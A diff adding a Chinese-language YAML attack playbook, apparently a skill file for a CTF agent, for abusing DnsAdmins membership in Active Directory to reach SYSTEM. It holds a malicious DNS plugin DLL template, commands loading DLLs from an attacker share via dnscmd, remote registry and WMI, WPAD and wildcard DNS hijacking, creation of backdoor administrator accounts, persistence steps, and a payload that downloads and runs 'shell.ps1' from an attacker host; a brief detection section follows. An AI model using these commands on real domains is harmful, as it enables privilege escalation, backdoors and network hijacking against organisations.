@@ -1,0 +1,361 @@
+name: dns_admin_attack
+description: DnsAdmins权限利用 - 利用DnsAdmins组权限加载恶意DLL、实现权限提升和持久化
+version: "2.0"
+author: CTF-Agent Team
+tags: [dnsadmin, dns-server, privilege-escalation, dll-injection, active-directory]
+priority: high
+
+# 使用场景
+scenarios:
+  - DnsAdmins组权限利用
+  - DNS服务器DLL加载攻击
+  - 通过DNS实现SYSTEM权限
+  - DNS记录操作权限滥用
+  - DNS持久化技术
+
+# 核心技术
+techniques:
+  - DLL Loading via DNSAdmins: 通过dnscmd加载恶意DLL
+  - ServerLevelPluginDll Attack: 服务器级别插件DLL注入
+  - DNS Record Manipulation: DNS记录操作滥用
+  - DNS Admin Privilege Abuse: DNS管理权限滥用
+  - DnsAdmins to SYSTEM: 从DnsAdmins到SYSTEM权限
+
+# 工具列表
+tools:
+  - dnscmd: Windows DNS命令行工具
+  - DNS Manager: DNS图形管理工具
+  - PowerView: AD枚举
+  - SharpDnsAdmin: C# DNS攻击工具
+  - Impacket: DNS协议工具
+  - BloodHound: DnsAdmins权限路径分析
+
+# DnsAdmins基础
+basics:
+  - concept: |
+      # DnsAdmins概述
+
+      # DnsAdmins组是什么?
+      # - AD内置组，用于管理DNS服务器
+      # - 默认成员包括Domain Admins
+      # - 可能包含其他被委派的用户
+
+      # DnsAdmins权限:
+      # - 管理DNS服务器配置
+      # - 创建/修改/删除DNS记录
+      # - 加载服务器级别插件DLL
+      # - 重启DNS服务
+
+      # 为什么危险?
+      # - DNS服务以SYSTEM权限运行
+      # - 加载的DLL将以SYSTEM权限执行
+      # - 可实现从普通用户到SYSTEM的权限提升
+
+      # 检查DnsAdmins成员
+      Get-ADGroupMember -Identity "DnsAdmins"
+
+  - dll_loading_mechanism: |
+      # DNS DLL加载机制
+
+      # ServerLevelPluginDll参数:
+      # - 允许加载自定义DLL到DNS服务
+      # - DLL以SYSTEM权限运行
+      # - 在DNS服务启动时加载
+
+      # 注册表位置:
+      # HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+      # ServerLevelPluginDll = "DLL_PATH"
+
+      # dnscmd命令:
+      dnscmd.exe /config /serverlevelplugindll DLL_PATH
+
+      # DLL要求:
+      # - 必须导出DnsPluginInitialize
+      # - 必须导出DnsPluginCleanup
+      # - 必须导出DnsPluginQuery
+
+# 信息收集
+reconnaissance:
+  - dnsadmins_check: |
+      # 检查DnsAdmins权限
+
+      # 检查组成员
+      Get-ADGroupMember -Identity "DnsAdmins"
+
+      # 使用PowerView
+      Get-DomainGroupMember -Identity "DnsAdmins"
+
+      # 检查当前用户是否在DnsAdmins
+      whoami /groups | findstr "DnsAdmins"
+
+      # 检查DNS服务器
+      Get-DomainComputer -LDAPFilter "(operatingSystem=*Server*)" | Where-Object {
+        $_.ServicePrincipalNames -match "DNS"
+      }
+
+      # BloodHound分析
+      # 查找DnsAdmins组成员和路径
+
+  - dns_server_enum: |
+      # DNS服务器枚举
+
+      # 查找DNS服务器
+      Get-DomainComputer -ServicePrincipalName "DNS*" -Properties name,operatingSystem
+
+      # 检查DNS服务状态
+      Get-Service -ComputerName "DNS_SERVER" -Name "DNS"
+
+      # 检查DNS配置
+      dnscmd.exe /info
+
+      # 检查现有DLL配置
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
+
+# DLL加载攻击
+dll_attack:
+  - technique: |
+      # DNS DLL加载攻击
+
+      # 前置条件:
+      # 1. 用户在DnsAdmins组
+      # 2. 有DNS服务器的管理权限
+      # 3. DLL可被DNS服务器访问
+
+      # 步骤:
+
+      # 1. 创建恶意DLL
+      # 使用模板创建DLL
+
+      # 2. 将DLL放到可访问位置
+      # SMB共享、本地路径等
+
+      # 3. 使用dnscmd加载DLL
+      dnscmd.exe \\DNS_SERVER /config /serverlevelplugindll \\attacker\share\malicious.dll
+
+      # 4. 重启DNS服务
+      sc \\DNS_SERVER stop dns
+      sc \\DNS_SERVER start dns
+
+      # 或使用PowerShell
+      Invoke-Command -ComputerName DNS_SERVER -ScriptBlock {
+        Restart-Service -Name "DNS" -Force
+      }
+
+      # 5. DLL以SYSTEM权限执行
+
+  - dll_template: |
+      # 恶意DLL模板
+
+      // malicious_dns_dll.cpp
+
+      #include <windows.h>
+
+      extern "C" __declspec(dllexport)
+      DWORD __stdcall DnsPluginInitialize(PVOID p1, PVOID p2) {
+        // 执行恶意代码
+        // 以SYSTEM权限运行
+
+        // 示例: 创建反向shell
+        WinExec("cmd.exe /c whoami > C:\\temp.txt", SW_HIDE);
+
+        return 0;
+      }
+
+      extern "C" __declspec(dllexport)
+      DWORD __stdcall DnsPluginCleanup() {
+        return 0;
+      }
+
+      extern "C" __declspec(dllexport)
+      DWORD __stdcall DnsPluginQuery(PVOID p1, PVOID p2, PVOID p3, PVOID p4) {
+        return 0;
+      }
+
+      // 编译命令:
+      // cl.exe /LD malicious_dns_dll.cpp
+
+  - alternative_methods: |
+      # 替代DLL加载方法
+
+      # 方法1: 通过注册表远程修改
+
+      # 连接远程注册表
+      reg add "\\DNS_SERVER\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /t REG_SZ /d "\\attacker\share\malicious.dll" /f
+
+      # 方法2: 通过WMI
+
+      $dllPath = "\\attacker\share\malicious.dll"
+      Invoke-WmiMethod -ComputerName DNS_SERVER -Class Win32_Service -Name Change -ArgumentList @($null,$null,$null,$null,$dllPath) -Namespace "root\cimv2"
+
+      # 方法3: 通过PowerShell远程
+
+      Invoke-Command -ComputerName DNS_SERVER -ScriptBlock {
+        reg add "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /t REG_SZ /d "\\attacker\share\malicious.dll" /f
+        Restart-Service -Name "DNS" -Force
+      }
+
+# DNS记录滥用
+dns_record_abuse:
+  - technique: |
+      # DNS记录滥用
+
+      # 创建恶意DNS记录
+      dnscmd.exe \\DNS_SERVER /recordadd domain.local attacker A 192.168.1.100
+
+      # 创建WPAD记录(用于NTLM relay)
+      dnscmd.exe \\DNS_SERVER /recordadd domain.local wpad A 192.168.1.100
+
+      # 创建Wildcard记录
+      dnscmd.exe \\DNS_SERVER /recordadd domain.local * A 192.168.1.100
+
+      # DNS劫持
+      dnscmd.exe \\DNS_SERVER /recordadd domain.local www A attacker_ip
+
+      # 删除记录
+      dnscmd.exe \\DNS_SERVER /recorddelete domain.local attacker A /f
+
+# 权限提升
+privilege_escalation:
+  - technique: |
+      # DnsAdmins到SYSTEM
+
+      # 完整攻击流程
+
+      # 1. 确认在DnsAdmins组
+      whoami /groups
+
+      # 2. 确认DNS服务器
+      Get-DomainComputer -ServicePrincipalName "DNS*"
+
+      # 3. 创建恶意DLL(添加用户)
+      # DLL内容:
+      WinExec("cmd.exe /c net user backdoor password123 /add && net localgroup administrators backdoor /add", SW_HIDE);
+
+      # 4. 上传DLL到可访问位置
+      copy malicious.dll \\DNS_SERVER\C$\Windows\Temp\
+
+      # 5. 配置DLL加载
+      dnscmd.exe \\DNS_SERVER /config /serverlevelplugindll C:\Windows\Temp\malicious.dll
+
+      # 6. 重启DNS服务
+      sc \\DNS_SERVER stop dns
+      sc \\DNS_SERVER start dns
+
+      # 7. 验证权限提升
+      net user backdoor
+      net localgroup administrators
+
+      # 8. 清理DLL配置
+      dnscmd.exe \\DNS_SERVER /config /serverlevelplugindll ""
+
+# 持久化
+persistence:
+  - technique: |
+      # DNS持久化
+
+      # 方法1: 永久DLL加载
+      # 不删除ServerLevelPluginDll配置
+
+      # 方法2: 定期重新加载DLL
+      # 监控DLL配置是否被清理
+
+      # 方法3: 创建后门DNS记录
+
+      # 创建特殊记录用于后门通信
+      dnscmd.exe /recordadd domain.local backdoor A attacker_ip
+
+      # 方法4: DNS服务配置持久化
+
+# 检测和防御
+defense:
+  - detection: |
+      # 检测DnsAdmins攻击
+
+      # 1. 监控DnsAdmins组成员变更
+      Get-WinEvent -FilterHashtable @{
+        LogName='Security'
+        ID=4728,4732,4756
+      } | Where-Object { $_.Message -match "DnsAdmins" }
+
+      # 2. 监控DNS服务重启
+
+      # 3. 监控ServerLevelPluginDll注册表修改
+      Get-WinEvent -FilterHashtable @{
+        LogName='Security'
+        ID=4657
+      } | Where-Object {
+        $_.Message -match "ServerLevelPluginDll"
+      }
+
+      # 4. 检查异常DLL配置
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll
+
+      # 5. 审计DNS记录变更
+
+  - mitigation: |
+      # 缓解措施
+
+      # 1. 严格限制DnsAdmins组成员
+
+      # 2. 监控ServerLevelPluginDll设置
+
+      # 3. 禁止从网络位置加载DLL
+
+      # 4. 启用DNS服务日志
+
+      # 5. 定期审计DNS配置
+
+      # 6. 使用AppLocker限制DLL加载
+
+# 完整攻击流程
+attack_chain:
+  - step1: "检查DnsAdmins组成员身份"
+  - step2: "识别DNS服务器"
+  - step3: "创建恶意DLL"
+  - step4: "上传DLL到可访问位置"
+  - step5: "配置ServerLevelPluginDll"
+  - step6: "重启DNS服务触发DLL执行"
+  - step7: "清理痕迹维持权限"
+
+# Payload模板
+payloads:
+  - name: "DnsAdmins DLL加载Payload"
+    template: |
+      # DnsAdmins DLL加载攻击Payload
+
+      # 1. 检查权限
+      whoami /groups
+
+      # 2. 上传DLL
+      copy malicious.dll \\DNS_SERVER\C$\Windows\Temp\
+
+      # 3. 配置DLL
+      dnscmd.exe \\DNS_SERVER /config /serverlevelplugindll C:\Windows\Temp\malicious.dll
+
+      # 4. 重启服务
+      sc \\DNS_SERVER stop dns
+      sc \\DNS_SERVER start dns
+
+      # 5. 验证
+      dir \\DNS_SERVER\C$\temp.txt
+
+      # 6. 清理
+      dnscmd.exe \\DNS_SERVER /config /serverlevelplugindll ""
+
+  - name: "DnsAdmins用户添加Payload"
+    template: |
+      # DLL代码片段
+
+      // 添加后门用户
+      WinExec("cmd.exe /c net user backdoor P@ssw0rd! /add", SW_HIDE);
+      WinExec("cmd.exe /c net localgroup administrators backdoor /add", SW_HIDE);
+
+      // 或执行反向shell
+      WinExec("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')", SW_HIDE);
+
+# 参考资源
+references:
+  - https://adsecurity.org/?p=4044
+  - https://www.harmj0y.net/blog/ad/dns-admins-to-domain-admins/
+  - https://github.com/GhostPack/SharpDnsAdmin
+  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-in-one-hour-a-i-72e2bd1d6c5
